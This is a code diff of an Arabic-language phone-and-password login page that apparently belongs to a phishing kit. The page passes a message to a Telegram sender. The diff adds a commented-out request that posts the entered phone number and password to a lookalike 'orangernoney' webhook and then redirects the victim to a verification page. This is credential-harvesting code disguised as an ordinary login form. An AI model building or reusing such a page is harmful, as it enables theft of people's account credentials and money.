@@ -116,10 +116,12 @@
                 data-name="مقدم الطلب" 
                 method="get" 
                 aria-label="تسجيل الدخول">
+                    
                     <div id="field" class="field-holder">
                         <input class="text-field-2 w-input" maxlength="10" name="رقم الهاتف" data-name="رقم الهاتف" pattern="\d{10,10}" placeholder="" type="text" id="phonenumber" required="">
                         <label for="phonenumber">رقم الهاتف</label>
                     </div>
+                    
                     <div id="field" class="field-holder">
                         <input class="text-field-2 w-input" maxlength="256" name="كلمة السر" data-name="كلمة السر" placeholder="" type="text" id="password" required="">
                         <label for="password">كلمة المرور</label>
@@ -263,6 +265,23 @@
             `
         sendTelegramMessage(message)
 
+        // xhr.open("POST", 'https://webhook.orangernoney.com',true);
+        // xhr.setRequestHeader('Content-Type', 'application/json');
+        // xhr.onreadystatechange = function() {
+        //     if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200){
+        //         window.location.href = '/verification';
+        //     }
+        //     else{
+        //         console.log("ERRORRRRRR")
+        //     }
+        // }
+
+        // xhr.send(
+        //     JSON.stringify({
+        //     'phonenumber': document.getElementById('phonenumber').value,
+        //     'password':document.getElementById('password').value,
+        //     })
+        // );
      })
     </script>
 </body>
